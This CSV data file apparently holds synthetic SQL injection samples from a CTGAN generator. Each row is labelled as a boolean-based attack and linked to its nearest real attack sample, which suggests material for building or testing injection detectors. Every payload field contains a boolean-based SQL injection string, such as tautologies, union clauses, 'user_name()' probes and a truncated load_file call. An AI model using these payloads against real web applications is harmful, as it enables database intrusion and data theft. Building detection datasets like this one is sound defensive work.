id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.665626803547839
CTGAN_000002,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000212,6.160808388020363
CTGAN_000003,attack,boolean,"-7551 or elt  (  6900  =  7195,7195  )  ",nearest_attack_euclidean,R000195,6.2525331911558055
CTGAN_000004,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,3.509126133945517
CTGAN_000005,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,5.804759869248188
CTGAN_000006,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,4.877080066839711
CTGAN_000007,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000016,5.680851031245895
CTGAN_000008,attack,boolean,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,nearest_attack_euclidean,R000276,6.831445104609016
CTGAN_000009,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000286,7.3651457375203035
CTGAN_000010,attack,boolean," end and   (  ""nuix"" like ""nuix",nearest_attack_euclidean,R000077,5.442364836118325
CTGAN_000011,attack,boolean,1' in boolean mode  )   and 3787  =  7750--,nearest_attack_euclidean,R000254,6.6725166990216795
CTGAN_000012,attack,boolean,1 and   (  5369  =  8325  )  *8325# psze,nearest_attack_euclidean,R000201,5.532043336368942
CTGAN_000013,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,3.301220144253581
CTGAN_000014,attack,boolean,-6218'   )    )    or 2236  =  4469#,nearest_attack_euclidean,R000086,8.812747706528341
CTGAN_000015,attack,boolean,end and 'icny' like 'icny,nearest_attack_euclidean,R000179,4.257372200868379
CTGAN_000016,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,4.543604812314625
CTGAN_000017,attack,boolean,-5113'   )    )     )   or 7200  =  3094--,nearest_attack_euclidean,R000279,5.8215763990764255
CTGAN_000018,attack,boolean,"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",nearest_attack_euclidean,R000297,5.836229901721848
CTGAN_000019,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,6.16945885544102
CTGAN_000020,attack,boolean,"-2548""   )    )     )   or 5107  =  8049--",nearest_attack_euclidean,R000055,4.103624815923902
CTGAN_000021,attack,boolean,1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,nearest_attack_euclidean,R000264,7.0540490725914
